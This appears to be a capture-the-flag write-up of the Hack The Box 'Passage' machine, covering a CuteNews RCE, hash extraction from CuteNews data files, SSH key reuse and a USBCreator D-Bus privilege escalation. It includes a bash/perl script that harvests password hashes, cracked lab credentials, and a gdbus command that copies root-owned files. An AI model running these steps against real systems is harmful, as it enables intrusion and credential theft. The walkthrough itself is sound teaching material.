---
title: 'HTB-Passage'
published: 2025-09-18
draft: false
toc: true
---
**Start 09:35 28-10-2025**

---
```
Scope:
10.10.10.206
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- -vvvv -T5 --min-rate=5000 -Pn passage.htb

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/TCP - HTTP

![](attachments/a6fa9750217ae1b16370f2649cc18c5a.png)

We can leave comments:

![](attachments/ab7662dc067adc451774077f190ba8dc.png)

>[!note]
>The blog mentions that they've implemented a **Fail2Ban** system where it will block us for 2 minutes in case of heavy traffic so we will have to limit our automated testing.

I checked out the tech stack:

![](attachments/c3167b98cf67217382fef5b14f81ca62.png)

And noticed that the site is powered by **CuteNews** and the copyright mentions **Passage News 2020** so I started checking for exploits:

![](attachments/11c8cb606303f2a8536b29e874beb856.png)

# Exploitation
## CVE-2019-11447

I checked out [the exploit](https://www.exploit-db.com/exploits/48800):

![](attachments/3d99ff6609df84b0648d83a230251ee0.png)

I went ahead and tested it out:

![](attachments/70f3a3a7e60a3b14c0b69655d6d1c6a6.png)

And we've successfully achieved **RCE**, time to execute some commands.

# Foothold
## Shell as www-data

I then established a reverse shell connection:

![](attachments/8109347aca07f39b6cfd6739b5a1bde5.png)

![](attachments/29543aa71475d93764bf9a49e1b9943d.png)

Hereafter I enumerated the users present on the target:

![](attachments/28fd1d994978ad84f0beed0267d48b56.png)

I didn't have permissions over either directories.

Looking around in the webroot I found something interesting:

![](attachments/38a521b21d4d439f3459d97f324b5158.png)

![](attachments/4fce876d898ce1cc78fb13dbeaa5d44d.png)

These files all contained lines that looked like this:

![](attachments/233d3c5552d9db062327a295fa28642f.png)

These are `base64` encoded and are easily decoded:

![](attachments/6e38db4616ed2b9f1c16233d928c558b.png)

However some files, like `b0.php` in this case, were bigger and contained more info:

![](attachments/0d5694f1f456a95a0f00a4aff03fdab1.png)

It looks like some of these contain hashes, which is great since there are 2 users on the system, where one of them is *paul*. We can enumerate this quicker instead of just going through them manually:

```bash
for f in *; do
>   body=$(sed -n '1,200p' "$f" \
>     | sed '1s/^<?php.*die;//I' \
>     | tr -d '\r\n' \
>     | sed 's/[^A-Za-z0-9+\/=]//g')
>   [ -z "$body" ] && continue
>   echo "$body" | base64 -d 2>/dev/null || continue
> done \
> | perl -0777 -ne '
>   # match the structure: s:<len>:"name";a:<n>:{ s:<len>:"<username>";a:<m>:{ ... s:4:"pass";s:<len>:"<hash>" ...
>   while (m/s:\d+:"name";a:\d+:\{\s*s:\d+:"([^"]+)";a:\d+:\{.*?s:4:"pass";s:\d+:"([0-9a-f]{64})"/gs) {
>     print "$1:$2\n";
>   }
> ' \
> | sort -u
```

![](attachments/1eacaad619dc8d958eccfc048ddba7ef.png)

Only 2 of these were crackable:

![](attachments/1a10575968adae233628b66a22e0d1b8.png)

## Shell as paul

We can use the following creds to get a shell as *paul*:

```
paul
atlanta1
```

![](attachments/744b040ecb238ced5cbc64ba2f0106ad.png)

### user.txt

![](attachments/ad048089c92b8f39ce489e356779fab9.png)

### Enumeration

Unfortunately I can't run `sudo -l`:

![](attachments/48fecdf7708a94c44fdbefd94f880f3f.png)

I then read the `id_rsa` and used it to log in:

![](attachments/50fef8f286c08326834b62785658dd34.png)

![](attachments/1dff35f3ac83b5f8c70a84b04c2d23d1.png)

While checking further I didn't see anything noteworthy on the surface except for the fact that the `id_rsa.pub` had *nadav*'s name in it:

![](attachments/4261ca58ccb4a878c8101b1bea992813.png)

Could this be a shared key?

## Shell as nadav

![](attachments/e5d733a1b0669b0576e3d1bf1d4f68a0.png)

It turns out the same key can be used to log in as *nadav*.

### Enumeration

While I can't run `sudo -l`:

![](attachments/bd11c652530c7279b810a6ed6f1533d5.png)

I did notice that this user is in some *interesting* groups to say the least:

![](attachments/c973c7eb8c64540a300aceb0d61a004f.png)

Unfortunately for us though we can't do anything with the `sudo` group as we don't have the password for *nadav*...

# Privilege Escalation
## USBCreator D-Bus

I found a [blog](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) that showed a flaw in the **USBCreator D-Bus** interface:

![](attachments/f9442fc07bc37c1b652c04b18a356ffb.png)

Interestingly they mention the same *nadav* user in their blog:

![](attachments/8ead5b3d972303f5ae0aeedea7008036.png)

### Exploitation

1. Copy a file to a non-existent file location:

```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/owned true
```

2. Read the file:

![](attachments/44dab6d3c2ce301a847783d3cd3081d7.png)

Now we can abuse the fetched `id_rsa` to log in as *root*.

![](attachments/75351e6d0c9ca0fa104b162bdef7aede.png)

### root.txt

![](attachments/ad9c5cb2f822ad2363c0b57b8fce23de.png)

![](attachments/c9cfd16c48652e893f370d337a333c85.png)

---

**Finished 11:00 28-10-2025**

[^Links]: [[Hack The Box]]

#CVE-2019-11447 #USBCreator #D-Bus 
